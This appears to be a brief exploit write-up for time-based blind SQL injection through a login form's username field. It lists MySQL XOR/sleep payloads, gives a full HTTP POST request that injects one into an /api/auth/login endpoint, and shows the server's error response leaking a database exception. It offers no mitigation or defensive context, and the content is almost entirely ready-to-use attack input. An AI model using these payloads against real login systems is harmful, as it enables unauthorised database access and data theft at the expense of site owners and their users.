# SQLI-INJECTION-VIA-USERNAME-PASSWORD-FIELD
SQLI INJECTION VIA USERNAME PASSWORD FIELD

PAYLOAD :
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
```

REQUEST :

```
POST /*/api/auth/login HTTP/1.1
Host: target.com
Content-Length: 135


{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
```

RESPONSE :

```
HTTP/2  500 Internal Server Error Server:
nginx Date: Mon, 27 Dec 2021 16:01:42 GMT
Content-Type: application/json

{ "error": 3, "message": "MySQL Query Failed: Nyotron. Core. DataAccess.
 NyotronDbContext. AddActivityLogAsyn c due to: Data too long for column 'doer' at row 1" }
```
